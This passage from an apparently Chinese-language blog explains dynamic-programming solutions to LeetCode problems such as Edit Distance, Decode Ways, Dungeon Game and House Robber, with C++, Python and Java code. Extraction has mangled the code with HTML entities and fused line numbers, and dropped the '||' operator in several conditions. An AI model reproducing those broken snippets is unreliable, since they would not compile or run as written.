a.size(); ++i) for(int j = 0; j &lt; a[0].size(); ++j) for(int k = 0; k &lt; b.size(); ++k) res[i][j] += a[i][k] * b[k][j]; return res; &#125;&#125;; 72. Edit Distance Given two words word1 and word2, find the minimum number of steps required to convert word1 to word2. (each operation is counted as 1 step.) You have the following 3 operations permitted on a word: Insert a character Delete a character Replace a character 题目地址：leetcode Edit Distance 题目大意：给定两个字符串，求他们的编辑距离（即可以插入、修改、删除一个字符，用最少的步数使得一个字符串变为另一个字符串） 思路:设dp[i][j]为以i和j结尾的字符串的编辑距离。 if word[i] == word[j] ： dp[i][j] = dp[i-1][j-1] if word[i] != word[j] ： dp[i][j] 下面三个数的最小值+1： dp[i-1][j] 可以看为word1[i-1]然后插入一个字符（word2[j]),或者说删掉 word2[j] dp[i][j-1] 可以看为word2[j-1]然后插入一个数(word1[i])，或者说删掉 word1[i] dp[i-1][j-1]把word1[i]改为word2[j]，或者word2[j]改为word1[i] 还可以只用O(n)空间, 见java版本。其他语言其实类似，不想写了。 C++ 1234567891011121314151617181920class Solution &#123; public: int minDistance(string word1, string word2) &#123; int m = word1.size(), n = word2.size(); vector&lt;vector&lt;int&gt; &gt; dp(m+1, vector&lt;int&gt;(n+1, 0)); for (int i = 1; i &lt;= m; i++) dp[i][0] = i; for (int j = 1; j &lt;= n; j++) dp[0][j] = j; for (int i = 1; i &lt;= m; i++) &#123; for (int j = 1; j &lt;= n; j++) &#123; if (word1[i - 1] == word2[j - 1]) dp[i][j] = dp[i - 1][j - 1]; else dp[i][j] = min(dp[i - 1][j - 1], min(dp[i - 1][j], dp[i][j - 1])) + 1; &#125; &#125; return dp[m][n]; &#125; &#125;; Python 1234567891011121314151617181920class Solution(object): def minDistance(self, word1, word2): &quot;&quot;&quot; :type word1: str :type word2: str :rtype: int &quot;&quot;&quot; dp = [[0] * (len(word2) + 1) for _ in range(len(word1) + 1)] for i in range(len(word1) + 1): dp[i][0] = i for j in range(len(word2) + 1): dp[0][j] = j for i in range(1, len(word1) + 1): for j in range(1, len(word2) + 1): if word1[i - 1] == word2[j - 1]: dp[i][j] = dp[i - 1][j - 1] else: dp[i][j] = min(dp[i - 1][j - 1], dp[i - 1][j], dp[i][j - 1]) + 1 return dp[-1][-1] Java 因为只用到左上方，左边，和上边的元素，所以可以只用两个数组。 12345678910111213141516171819class Solution &#123; public int minDistance(String word1, String word2) &#123; int[] dp = new int[word2.length() + 1]; for (int j = 0; j &lt;= word2.length(); j++) dp[j] = j; for (int i = 1; i &lt;= word1.length(); i++) &#123; int[] ndp = new int[word2.length() + 1]; ndp[0] = i; for (int j = 1; j &lt;= word2.length(); j++) &#123; if (word1.charAt(i - 1) == word2.charAt(j - 1)) ndp[j] = dp[j - 1]; else ndp[j] = Math.min(ndp[j - 1], Math.min(dp[j - 1], dp[j])) + 1; &#125; dp = ndp; &#125; return dp[word2.length()]; &#125;&#125; 87. Scramble String Given a string s1, we may represent it as a binary tree by partitioning it to two non-empty substrings recursively. Below is one possible representation of s1 = \"great\": 12345678 great &#x2F; \\ gr eat &#x2F; \\ &#x2F; \\g r e at &#x2F; \\ a t To scramble the string, we may choose any non-leaf node and swap its two children. For example, if we choose the node \"gr\" and swap its two children, it produces a scrambled string \"rgeat\". 12345678 rgeat &#x2F; \\ rg eat &#x2F; \\ &#x2F; \\r g e at &#x2F; \\ a t We say that \"rgeat\" is a scrambled string of \"great\". Similarly, if we continue to swap the children of nodes \"eat\" and \"at\", it produces a scrambled string \"rgtae\". 12345678 rgtae &#x2F; \\ rg tae &#x2F; \\ &#x2F; \\r g ta e &#x2F; \\ t a We say that \"rgtae\" is a scrambled string of \"great\". Given two strings s1 and s2 of the same length, determine if s2 is a scrambled string of s1. 题目地址：leetcode Scramble String 题目大意：给定两个字符串s1和s2，判断s2是否是s1经过旋转得到的。 思路： 根据题目的描述，我们可以枚举切分点i,然后递归判断: s1[0, i-1]和s2[0, i-1] 是否可以旋转得到，并且s1[i, n - 1]和s2[i, n- 1] 也要能旋转得到 或者s1[0, i - 1]和s2[n - i, n - 1] 是否可以旋转得到，并且s1[i, n- 1]和s2[0, n - i] 也要能旋转得到 可以用记忆化搜索防止重复搜索，还可以用排序剪枝（看看当前的s1和s2排序后是否相等） C++ 1234567891011121314151617181920212223242526272829class Solution &#123; bool judge(string s1, string s2, unordered_map&lt;string, bool&gt; &amp;vis)&#123; if(s1.size() != s2.size()) return false; if(s1 == s2) return true; if(vis.find(s1 + s2) != vis.end()) return vis[s1 + s2]; string t1(s1), t2(s2); sort(t1.begin(), t1.end()); sort(t2.begin(), t2.end()); if(t1 == t2)&#123; for(int i = 1; i &lt; s2.size(); ++i)&#123; if(judge(s1.substr(0, i), s2.substr(0, i), vis) &amp;&amp; judge(s1.substr(i), s2.substr(i), vis)) return true; if(judge(s1.substr(0, i), s2.substr(s2.size() - i), vis) &amp;&amp; judge(s1.substr(i), s2.substr(0, s2.size() - i), vis)) return true; &#125; &#125; return vis[s1 + s2] = false; &#125; public: bool isScramble(string s1, string s2) &#123; unordered_map&lt;string, bool&gt; vis; return judge(s1, s2, vis); &#125;&#125;; Python 12345678910111213141516171819202122232425262728293031class Solution(object): def judge(self, s1, s2, dp): if (s1, s2) in dp: return dp[s1, s2] if s1 == s2: dp[s1, s2] = True return True if sorted(s1) != sorted(s2): return False for i in range(1, len(s1)): if self.judge(s1[:i], s2[:i], dp) and self.judge(s1[i:], s2[i:], dp) or \\ self.judge(s1[:i], s2[-i:], dp) and self.judge(s1[i:], s2[:-i], dp): dp[s1, s2] = True return True dp[s1, s2] = False return False def isScramble(self, s1, s2): &quot;&quot;&quot; :type s1: str :type s2: str :rtype: bool &quot;&quot;&quot; if len(s1) != len(s2): return False dp = &#123;&#125; return self.judge(s1, s2, dp) 91. Decode Ways A message containing letters from A-Z is being encoded to numbers using the following mapping: 'A' -&gt; 1 'B' -&gt; 2 ... 'Z' -&gt; 26 Given an encoded message containing digits, determine the total number of ways to decode it. For example, Given encoded message \"12\", it could be decoded as \"AB\" (1 2) or \"L\" (12). The number of ways decoding \"12\" is 2. 题目地址：leetcode Decode Ways 题目大意：给定一个数字组成的字符串，让你看有多少种解码方式 思路： 对于一个编码后的串s，s的所有的字符出现在0~9之间。 要查看其解码方式有多少种可能，主要在于因为有的字符可以被拆分，如12可以算L也可以算AB，而这样的在10~26均是可能的。 设dp[i]为s[0...i]最多的解码方式，因此我们有： 若s[i] !='0' , dp[i] += dp[i-1] 若10 &lt;= s[i-1,i] &lt;=26 , dp[i] += dp[i-2] 12345678910111213141516class Solution(object): def numDecodings(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; if not s: return 0 n = len(s) dp = [0] * n dp[0] = 1 if s[0] != &#x27;0&#x27; else 0 for i in range(1, n): if 10 &lt;= int(s[i - 1:i + 1]) &lt;= 26: dp[i] += dp[i - 2] if i &gt;= 2 else 1 if s[i] != &#x27;0&#x27;: dp[i] += dp[i - 1] return dp[n - 1] C++ 感觉第二次写的C++版本更清晰一些。 若s[i] !='0', dp[i] += dp[i-1] 若10 &lt;= s[i-1,i] &lt;=26 , dp[i] += dp[i-2] s[i] =='0' , 看看是否能和前面的合并。不能就返回0，可以就是dp[i-2] 123456789101112131415161718class Solution &#123;public: int numDecodings(string s) &#123; if (s[0] &lt;= &#x27;0&#x27;) return 0; vector&lt;int&gt; dp(s.size(), 0); dp[0] = 1; for (int i = 1; i &lt; s.size(); ++i) &#123; if (s[i] &lt; &#x27;0&#x27; &amp;&amp; s[i] &gt; &#x27;9&#x27; || s[i] == &#x27;0&#x27; &amp;&amp; s[i - 1] == &#x27;0&#x27;) break; if (s[i] != &#x27;0&#x27;) dp[i] = dp[i - 1]; if (s[i - 1] == &#x27;1&#x27; || s[i - 1] == &#x27;2&#x27; &amp;&amp; s[i] &lt;= &#x27;6&#x27;) dp[i] += i &lt; 2 ? 1 : dp[i - 2]; &#125; return dp[s.size() - 1]; &#125;&#125;; 97. Interleaving String Given s1, s2, s3, find whether s3 is formed by the interleaving of s1 and s2. For example, Given: s1 = \"aabcc\", s2 = \"dbbca\", When s3 = \"aadbbcbcac\", return true. When s3 = \"aadbbbaccc\", return false. 题目地址：leetcode Interleaving String 题目大意：给定s1,s2,s3三个字符串，判断s3是否由s1和s2组成。 思路:设dp[i][j]为s1[i-1] , s2[j-1] 是否能组成 s3[i+j-1] dp[i][j] = s3[i+j-1]==s1[i-1] &amp;&amp; dp[i-1][j] s3[i+j-1]==s2[j-1] &amp;&amp; dp[i][j-1]; (尝试用s1[i-1]去匹配，故应该是dp[i-1][j]，同理用s2[j-1]去匹配） C++ 12345678910111213141516171819class Solution &#123;public: bool isInterleave(string s1, string s2, string s3) &#123; if (s1.size() + s2.size() != s3.size()) return false; vector&lt;vector&lt;bool&gt;&gt; dp(s1.size() + 1, vector&lt;bool&gt;(s2.size() + 1, false)); dp[0][0] = true; for (int i = 1; i &lt;= s1.size(); ++i) dp[i][0] = dp[i - 1][0] &amp;&amp; s3[i - 1] == s1[i - 1]; for (int j = 1; j &lt;= s2.size(); ++j) dp[0][j] = dp[0][j - 1] &amp;&amp; s3[j - 1] == s2[j - 1]; for (int i = 1; i &lt;= s1.size(); ++i) for (int j = 1; j &lt;= s2.size(); ++j) dp[i][j] = (dp[i - 1][j] &amp;&amp; s3[i + j - 1] == s1[i - 1]) || (dp[i][j - 1] &amp;&amp; s3[i + j - 1] == s2[j - 1]); return dp[s1.size()][s2.size()]; &#125;&#125;; Python 123456789101112131415161718192021222324class Solution(object): def isInterleave(self, s1, s2, s3): &quot;&quot;&quot; :type s1: str :type s2: str :type s3: str :rtype: bool &quot;&quot;&quot; m, n = len(s1), len(s2) if len(s3) != m + n: return False dp = [[False] * (n + 1) for _ in range(m + 1)] dp[0][0] = True for i in range(1, m + 1): dp[i][0] = dp[i - 1][0] and s1[i - 1] == s3[i - 1] for j in range(1, n + 1): dp[0][j] = dp[0][j - 1] and s2[j - 1] == s3[j - 1] for i in range(1, m + 1): for j in range(1, n + 1): dp[i][j] = (dp[i - 1][j] and s1[i - 1] == s3[i + j - 1]) \\ or (dp[i][j - 1] and s2[j - 1] == s3[i + j - 1]) return dp[m][n] 115. Distinct Subsequences Given a string S and a string T, count the number of distinct subsequences of T in S. A subsequence of a string is a new string which is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (ie, \"ACE\" is a subsequence of \"ABCDE\" while \"AEC\" is not). Here is an example: S = \"rabbbit\", T = \"rabbit\" Return 3. 题目地址：leetcode Distinct Subsequences 题目大意：给定S和T两个字符串，问把通过删除S中的某些字符，把S变为T有几种方法？ 思路：DP,设dp[i][j]为到S[i] T[j]位置的方法数： S[i]==T[j]: dp[i][j] = dp[i-1][j] + dp[i-1][j-1] 两字符串相等，要么跳过不匹配，要么匹配 S[i]!=T[j]: dp[i][j]= dp[i-1][j]不相等只能不匹配这个 初始值设置： dp[i][0] = dp[i - 1][0] + (s[i] == t[0]) 即t[0]可以被s表示的数量 C++ 123456789101112131415161718192021class Solution &#123;public: int numDistinct(string s, string t) &#123; int m = s.size(), n = t.size(); if(n &gt; m) return 0; vector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 0)); for(int i = 0; i &lt; m; ++i) dp[i][0] = (s[i] == t[0]) + (i &gt; 0? dp[i - 1][0] : 0); for(int i = 1; i &lt; m; ++i)&#123; for(int j = 1; j &lt; n; ++j)&#123; if(s[i] == t[j]) dp[i][j] = dp[i - 1][j - 1] + dp[i - 1][j]; else dp[i][j] = dp[i - 1][j]; &#125; &#125; return dp[m - 1][n - 1]; &#125;&#125;; 另一种写法： C++ 123456789101112131415161718class Solution &#123;public: int numDistinct(string s, string t) &#123; int m = s.size(), n = t.size(); vector&lt;vector&lt;int&gt;&gt; dp(m + 1, vector&lt;int&gt;(n + 1, 0)); for (int i = 0; i &lt;= m; i++) dp[i][0] = 1; for (int i = 1; i &lt;= m; i++) &#123; for (int j = 1; j &lt;= n; j++) &#123; if (s[i - 1] == t[j - 1]) dp[i][j] = dp[i - 1][j] + dp[i - 1][j - 1]; else dp[i][j] = dp[i - 1][j]; &#125; &#125; return dp[m][n]; &#125;&#125;; Python 1234567891011121314151617class Solution: # @return an integer def numDistinct(self, S, T): m , n = len(S),len(T) dp =[[0 for j in range(n+1)]for i in range(m+1)] for i in xrange(0,m+1): dp[i][0]=1 for i in xrange(1,m+1): for j in xrange(1,n+1): if S[i-1]==T[j-1]: dp[i][j]=dp[i-1][j-1]+dp[i-1][j] else: dp[i][j]=dp[i-1][j] return dp[m][n] 120. Triangle Given a triangle, find the minimum path sum from top to bottom. Each step you may move to adjacent numbers on the row below. For example, given the following triangle 123456[ [2], [3,4], [6,5,7], [4,1,8,3]] The minimum path sum from top to bottom is 11 (i.e., 2 + 3 + 5 + 1 = 11). Note: Bonus point if you are able to do this using only O(n) extra space, where n is the total number of rows in the triangle. 题目地址：leetcode Triangle 题目大意：给定一个三角形，求其从顶部到底部最小的和。 思路：DP，可以从上往下也可以从下往上 从下往上的版本: C++ 123456789101112class Solution &#123;public: int minimumTotal(vector&lt;vector&lt;int&gt;&gt;&amp; triangle) &#123; if(triangle.empty() triangle[0].empty()) return 0; vector&lt;int&gt; dp(triangle.back()); for(int i = triangle.size() - 2; i &gt;= 0; --i) for(int j = 0; j &lt;= i; ++j) dp[j] = min(dp[j], dp[j + 1]) + triangle[i][j]; return dp[0]; &#125;&#125;; Python 12345678910111213class Solution(object): def minimumTotal(self, triangle): &quot;&quot;&quot; :type triangle: List[List[int]] :rtype: int &quot;&quot;&quot; dp = triangle[-1] for i in range(len(triangle) - 2, -1, -1): next_dp = [0] * len(triangle[i]) for j in range(i + 1): next_dp[j] = min(dp[j], dp[j + 1]) + triangle[i][j] dp = next_dp return dp[0] 从下往上的版本： 123456789101112131415class Solution &#123;public: int minimumTotal(vector&lt;vector&lt;int&gt;&gt;&amp; triangle) &#123; if(triangle.empty() triangle[0].empty()) return 0; vector&lt;int&gt; dp(triangle.size() + 1, INT_MAX); dp[0] = triangle[0][0]; for(int i = 1; i &lt; triangle.size(); ++i)&#123; vector&lt;int&gt; next(triangle.size() + 1, INT_MAX); for(int j = 0; j &lt;= i; ++j) next[j] = min((j &gt; 0? dp[j - 1]:INT_MAX), dp[j]) + triangle[i][j]; dp = next; &#125; return *min_element(dp.begin(), dp.end()); &#125;&#125;; 139. Word Break Given a string s and a dictionary of words dict, determine if s can be segmented into a space-separated sequence of one or more dictionary words. For example, given s = \"leetcode\", dict = [\"leet\", \"code\"]. Return true because \"leetcode\" can be segmented as \"leet code\". 传送门 题意：给定一个字符串s和字典，判断字符串s是否能拆成仅由字典组成的若干个单词？ 思路：dp ，设dp[i]为 [0,i-1]是否能拆分 dp[i+1]= true dp[j] =true &amp;&amp; s[j,i]在字典中） 1A 1234567891011121314class Solution(object): def wordBreak(self, s, wordDict): &quot;&quot;&quot; :type s: str :type wordDict: Set[str] :rtype: bool &quot;&quot;&quot; n , dp = len(s),[True] + [False]*len(s) for i in xrange(n): for j in xrange(i+1): if dp[j] and s[j:i+1] in wordDict: dp[i+1]=True break return dp[n] 140. Word Break II Given a string s and a dictionary of words dict, add spaces in s to construct a sentence where each word is a valid dictionary word. Return all such possible sentences. For example, given s = \"catsanddog\", dict = [\"cat\", \"cats\", \"and\", \"sand\", \"dog\"]. A solution is [\"cats and dog\", \"cat sand dog\"]. 传送门 题意：给定一个字符串s和字典，将字符串s拆成仅由字典组成的若干个单词，返回所有的解 思路：在DFS的过程中，判断接下来的过程中是否有解。（就是进行剪枝操作啦），判断是否有解类似139那题。 Python 1234567891011121314151617181920212223242526272829303132333435class Solution(object): def wordBreak(self, s, wordDict): &quot;&quot;&quot; :type s: str :type wordDict: Set[str] :rtype: List[str] &quot;&quot;&quot; ans = [] if self.check(s, wordDict): self.dfs(0, len(s), &#x27;&#x27;, s, ans, wordDict) return ans def check(self, s, wordDict): dp = [True] + [False] * len(s) n = len(s) for i in xrange(n): for j in xrange(i + 1): if dp[j] and s[j:i + 1] in wordDict: dp[i + 1] = True break return dp[n] def dfs(self, cur, n, path, s, ans, wordDict): if cur == n: ans.append(path) return for i in xrange(cur, n): if s[cur:i + 1] in wordDict and self.check(s[i + 1:n], wordDict): if path: self.dfs(i + 1, n, path + &#x27; &#x27; + s[cur:i + 1], s, ans, wordDict) else: self.dfs(i + 1, n, s[cur:i + 1], s, ans, wordDict) 152. Maximum Product Subarray Find the contiguous subarray within an array (containing at least one number) which has the largest product. For example, given the array [2,3,-2,4], the contiguous subarray [2,3] has the largest product = 6. 传送门 题意：给定一个数组，求连续的乘积最大值。 思路：dp，设f(k)为乘积最大序列，g(k)为成绩最小序列，则有 f(k) = max( A[k] , f(k-1) * A[k], A[k], g(k-1) * A[k] ) g(k) = min(A[k], g(k-1) * A[k], A[k], f(k-1) * A[k] ) 之所以要维护一个最小的序列，是因为负数*负数变成正数，此时可能为最大。 1234567891011class Solution: # @param A, a list of integers # @return an integer def maxProduct(self, A): maxMul = minMul = ans = A[0] for i in range(1, len(A)): t = maxMul maxMul = max(t * A[i], minMul * A[i], A[i]) minMul = min(t * A[i], minMul * A[i], A[i]) ans = max(maxMul, ans) return ans 174. Dungeon Game The demons had captured the princess (P) and imprisoned her in the bottom-right corner of a dungeon. The dungeon consists of M x N rooms laid out in a 2D grid. Our valiant knight (K) was initially positioned in the top-left room and must fight his way through the dungeon to rescue the princess. The knight has an initial health point represented by a positive integer. If at any point his health point drops to 0 or below, he dies immediately. Some of the rooms are guarded by demons, so the knight loses health (negative integers) upon entering these rooms; other rooms are either empty (0's) or contain magic orbs that increase the knight's health (positive integers). In order to reach the princess as quickly as possible, the knight decides to move only rightward or downward in each step. Write a function to determine the knight's minimum initial health so that he is able to rescue the princess. For example, given the dungeon below, the initial health of the knight must be at least 7 if he follows the optimal path RIGHT-&gt; RIGHT -&gt; DOWN -&gt; DOWN. -2 (K) -3 -3 5 -10 1 -10 30 -5 (P) Notes: The knight's health has no upper bound. Any room can contain threats or power-ups, even the first room the knight enters and the bottom-right room where the princess is imprisoned. 题目地址：leetcode Dungeon Game 题目大意：一个骑士从左上角出发，要到达右下角拯救公主，每个格子中有正数表示可以增加的生命值，负数表示减少的生命。如果生命值为0，那么骑士就死翘翘了。你的任务是帮骑士计算到达右下角的最小生命值。 思路：DP，设dp[i][j]为到达(i,j)需要的最少生命值。则有： dp[i][j]= max(1, min(dp[i+1][j],dp[i][j+1])-dungeon[i][j]) 即，从右下角到左上角进行计算。对于dungeon为正数，那么减去，说明生命值可以少一些到达这个格子（但是不能小于等于0），对于负数，减去一个负数意味着加上这个数的绝对值，即需要的生命数增加。 为什么是右下角到左上角而不是左上到右下呢？ 如果途中遇到一个很大的正数，它就会覆盖掉你之前走过的所有信息。（变为0），这样的结果是错误的。 C++ 123456789101112131415161718class Solution &#123;public: int calculateMinimumHP(vector&lt;vector&lt;int&gt;&gt;&amp; dungeon) &#123; if (dungeon.empty()) return 0; int m = dungeon.size(), n = dungeon[0].size(); vector&lt;vector&lt;long long&gt;&gt; dp(m + 1, vector&lt;long long&gt;(n + 1, INT_MAX)); dp[m - 1][n] = dp[m][n - 1] = 1; for (int i = m - 1; i &gt;= 0; --i) &#123; for (int j = n - 1; j &gt;= 0; --j) &#123; dp[i][j] = min(dp[i + 1][j], dp[i][j + 1]) - dungeon[i][j]; if(dp[i][j] &lt;= 0) dp[i][j] = 1; &#125; &#125; return dp[0][0]; &#125;&#125;; Python 1234567891011121314class Solution(object): def calculateMinimumHP(self, dungeon): &quot;&quot;&quot; :type dungeon: List[List[int]] :rtype: int &quot;&quot;&quot; if not dungeon: return 0 m, n = len(dungeon), len(dungeon[0]) dp = [[0x7ffffff] * (n + 1) for _ in range(m + 1)] dp[m - 1][n] = dp[m][n - 1] = 1 for i in range(m - 1, -1, -1): for j in range(n - 1, -1, -1): dp[i][j] = max(1, min(dp[i + 1][j], dp[i][j + 1]) - dungeon[i][j]) return dp[0][0] 198. House Robber You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security system connected and it will automatically contact the police if two adjacent houses were broken into on the same night. Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police. 传送门 题意：要求从一串数字中选取一些数，使得和最大（相邻不能两两） 思路：dp[i]为到i能获得的最大值 i选择，那么只能dp[i-2]+num[i] i不选，那么dp[i-1] 所以有：dp[i]=max(dp[i-1],dp[i-2]+num[i]) 123456789101112class Solution: # @param num, a list of integer # @return an integer def rob(self, num): if not num: return 0 n = len(num) if n==1: return num[0] dp = [0]*n dp[0],dp[1] = num[0],max(num[1],num[0]) for i in xrange(2,n): dp[i]=max(dp[i-1],dp[i-2]+num[i]) return dp[n-1] 213. House Robber II Note: This is an extension of House Robber. After robbing those houses on that street, the thief has found himself a new place for his thievery so that he will not get too much attention. This time, all houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, the security system for these houses remain the same as for those in the previous street. Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police. 传送门 题意：和198. House Robber差别在于，这题要求首尾不能同时取到。 思路：和上一题其实一样的，我们只需要考虑[0,n-2]和[1,n-1]两个中最大值即可。。。 123456789101112131415161718class Solution: # @param &#123;integer[]&#125; nums # @return &#123;integer&#125; def rob(self, num): if not num: return 0 n = len(num) if n==1: return num[0] return max(self.solve(num[1:]),self.solve(num[:-1])) def solve(self,num): if not num: return 0 n = len(num) if n==1: return num[0] dp = [0]*n dp[0],dp[1] = num[0],max(num[1],num[0]) for i in xrange(2,n): dp[i]=max(dp[i-1],dp[i-2]+num[i]) return dp[n-1] 221. Maximal Square Given a 2D binary matrix filled with 0's and 1's, find the largest square containing all 1's and return its area. For example, given the following matrix: 123451 0 1 0 01 0 1 1 11 1 1 1 11 0 0 1 0 Return 4. 传送门 题意：给定2D矩阵，求里面1构成的正方形的最大面积。 思路：dp if matrix[i][j]=='1' dp[i][j] = min(dp[i-1][j],dp[i][j-1],dp[i-1][j-1])+1 else dp[i][j] = 0 Python 123456789101112131415class Solution: # @param &#123;character[][]&#125; matrix # @return &#123;integer&#125; def maximalSquare(self, matrix): if not matrix: return 0 m , n = len(matrix),len(matrix[0]) dp = [[0 if matrix[i][j]==&#x27;0&#x27; else 1for j in xrange(n)]for i in xrange(m)] for i in xrange(1,m): for j in xrange(1,n): if matrix[i][j] ==&#x27;1&#x27;: dp[i][j] = min(dp[i-1][j],dp[i][j-1],dp[i-1][j-1])+1 else: dp[i][j] = 0 ans = max([max(i) for i in dp]) return ans ** 2 712. Minimum ASCII Delete Sum for Two Strings Given two strings s1, s2, find the lowest ASCII sum of deleted characters to make two strings equal. Example 1: 123456**Input:** s1 &#x3D; &quot;sea&quot;, s2 &#x3D; &quot;eat&quot;**Output:** 231**Explanation:** Deleting &quot;s&quot; from &quot;sea&quot; adds the ASCII value of &quot;s&quot; (115) to the sum.Deleting &quot;t&quot; from &quot;eat&quot; adds 116 to the sum.At the end, both strings are equal, and 115 + 116 &#x3D; 231 is the minimum sum possible to achieve this. Example 2: 1234567**Input:** s1 &#x3D; &quot;delete&quot;, s2 &#x3D; &quot;leet&quot;**Output:** 403**Explanation:** Deleting &quot;dee&quot; from &quot;delete&quot; to turn the string into &quot;let&quot;,adds 100[d]+101[e]+101[e] to the sum. Deleting &quot;e&quot; from &quot;leet&quot; adds 101[e] to the sum.At the end, both strings are equal to &quot;let&quot;, and the answer is 100+101+101+101 &#x3D; 403.If instead we turned both strings into &quot;lee&quot; or &quot;eet&quot;, we would get answers of 433 or 417, which are higher. Note: 0 &lt; s1.length, s2.length &lt;= 1000. All elements of each string will have an ASCII value in [97, 122]. 题目地址：leetcode Minimum ASCII Delete Sum for Two Strings 题目大意：给定两个字符串，要求删掉一些字母，使得它们相等。要求删除字母的ASCII码的和最小。 思路： 显然，删掉的字母越少越好，自然就想到了求最长公共子串。这样，答案就是 两个字符串的ASCII码的和 - 公共子串ASCII码的和 * 2 如果有多个子串的话，就取和最大那个即可。 于是，可以类似LCS的解法，设dp[i][j]为s1前i个字符和s2前j个字符的最大公共子串的ASCII码的最大的和 于是有： s1[i] == s2[j] : dp[i][j] = dp[i-1][j-1] + ascii(s1[i]) s1[i] != s2[j] : dp[i][j] = max(dp[i-1][j], dp[i][j - 1]) C++ 1234567891011121314151617181920212223242526272829303132class Solution &#123;public: int minimumDeleteSum(string s1, string s2) &#123; int two_string_sum = 0; for (int i = 0; i &lt; s1.length(); i++) two_string_sum += s1[i]; for (int i = 0; i &lt; s2.length(); i++) two_string_sum += s2[i]; if (s1.empty() s2.empty()) return two_string_sum; vector&lt;vector&lt;int&gt;&gt; dp(s1.size(),vector&lt;int&gt;(s2.size(),0)); for (int i = 0; i &lt; s1.size(); i++) &#123; dp[i][0] = s1[i] == s2[0] ? s1[i] : 0; if (i &gt; 0 &amp;&amp; dp[i - 1][0] &gt; dp[i][0]) dp[i][0] = dp[i - 1][0]; &#125; for (int j = 0; j &lt; s2.size(); j++) &#123; dp[0][j] = s1[0] == s2[j] ? s2[j] : 0; if (j &gt; 0 &amp;&amp; dp[0][j - 1] &gt; dp[0][j]) dp[0][j] = dp[0][j - 1]; &#125; for (int i = 1; i &lt; s1.size(); i++) &#123; for (int j = 1; j &lt; s2.size(); j++) &#123; if (s1[i] == s2[j]) dp[i][j] = dp[i - 1][j - 1] + s1[i]; else dp[i][j] = max(dp[i - 1][j], dp[i][j - 1]); &#125; &#125; return two_string_sum - (dp[s1.size() - 1][s2.size() - 1] &lt;&lt; 1); &#125;&#125;; Java 1234567891011121314151617181920212223242526272829303132class Solution &#123; public int minimumDeleteSum(String s1, String s2) &#123; int twoStringSum = 0; for (int i = 0; i &lt; s1.length(); i++) twoStringSum += s1.charAt(i); for (int i = 0; i &lt; s2.length(); i++) twoStringSum += s2.charAt(i); if (s1.isEmpty() s2.isEmpty()) return twoStringSum; int[][] dp = new int[s1.length()][s2.length()]; for (int i = 0; i &lt; s1.length(); i++) &#123; dp[i][0] = s1.charAt(i) == s2.charAt(0) ? s1.charAt(i) : 0; if (i &gt; 0 &amp;&amp; dp[i - 1][0] &gt; dp[i][0]) dp[i][0] = dp[i - 1][0]; &#125; for (int j = 0; j &lt; s2.length(); j++) &#123; dp[0][j] = s1.charAt(0) == s2.charAt(j) ? s2.charAt(j) : 0; if (j &gt; 0 &amp;&amp; dp[0][j - 1] &gt; dp[0][j]) dp[0][j] = dp[0][j - 1]; &#125; for (int i = 1; i &lt; s1.length(); i++) &#123; for (int j = 1; j &lt; s2.length(); j++) &#123; if (s1.charAt(i) == s2.charAt(j)) dp[i][j] = dp[i - 1][j - 1] + s1.charAt(i); else dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]); &#125; &#125; return twoStringSum - (dp[s1.length() - 1][s2.length() - 1] &lt;&lt; 1); &#125;&#125; Python 123456789101112131415161718192021222324252627class Solution(object): def minimumDeleteSum(self, s1, s2): &quot;&quot;&quot; :type s1: str :type s2: str :rtype: int &quot;&quot;&quot; two_sum = sum(ord(c) for c in s1) + sum(ord(c) for c in s2) if not s1 or not s2: return two_sum dp = [[0] * len(s2) for _ in range(len(s1))] dp[0][0] = ord(s1[0]) if s1[0] == s2[0] else 0 for i in range(1, len(s1)): dp[i][0] = max(dp[i - 1][0], ord(s1[i])) if s1[i] == s2[0] else dp[i - 1][0] for j in range(1, len(s2)): dp[0][j] = max(dp[0][j - 1], ord(s2[j])) if s1[0] == s2[j] else dp[0][j - 1] for i in range(1, len(s1)): for j in range(1, len(s2)): if s1[i] == s2[j]: dp[i][j] = dp[i - 1][j - 1] + ord(s1[i]) else: dp[i][j] = max(dp[i - 1][j], dp[i][j - 1]) return two_sum - (dp[-1][-1] &lt;&lt; 1) 718. Maximum Length of Repeated Subarray Given two integer arrays A and B, return the maximum length of an subarray that appears in both arrays. Example 1: 1234567**Input:**A: [1,2,3,2,1]B: [3,2,1,4,7]**Output:** 3**Explanation:** The repeated subarray with maximum length is [3, 2, 1]. Note: 1 &lt;= len(A), len(B) &lt;= 1000 0 &lt;= A[i], B[i] &lt; 100 题目地址：leetcode Maximum Length of Repeated Subarray 题目大意: 给定两个数组A和B，求他们最大的公共子数组。 思路： 类似于LCS，这题也是DP 设dp[i][j]为以A[i],B[j]结尾的最大公共子数组的长度。 于是有 if A[i - 1] == B[j - 1] dp[i][j] = dp[i - 1][j - 1] + 1 A[i - 1] != B[j - 1] dp[i][j] = 0 ans则为dp数组的最大值 Java 1234567891011121314class Solution &#123; public int findLength(int[] A, int[] B) &#123; if (A.length == 0 B.length == 0) return 0; int[][] dp = new int[A.length + 1][B.length + 1]; int ans = 0; for (int i = 1; i &lt;= A.length; i++) &#123; for (int j = 1; j &lt;= B.length; j++) &#123; dp[i][j] = A[i - 1] == B[j - 1] ? dp[i - 1][j - 1] + 1 : 0; ans = Math.max(ans, dp[i][j]); &#125; &#125; return ans; &#125;&#125; 还可以用滚动数组优化空间复杂度O(n) Java 1234567891011121314class Solution &#123; public int findLength(int[] A, int[] B) &#123; if (A.length == 0 B.length == 0) return 0; int[] dp = new int[B.length + 1]; int ans = 0; for (int i = 1; i &lt;= A.length; i++) &#123; for (int j = B.length; j &gt;= 1; j--) &#123; dp[j] = A[i - 1] == B[j - 1] ? dp[j - 1] + 1 : 0; ans = Math.max(ans, dp[j]); &#125; &#125; return ans; &#125;&#125; Python 1234567891011121314class Solution(object): def findLength(self, A, B): &quot;&quot;&quot; :type A: List[int] :type B: List[int] :rtype: int &quot;&quot;&quot; dp = [0] * (len(B) + 1) ans = 0 for i in range(1, len(A) + 1): for j in range(len(B), 0, -1): dp[j] = 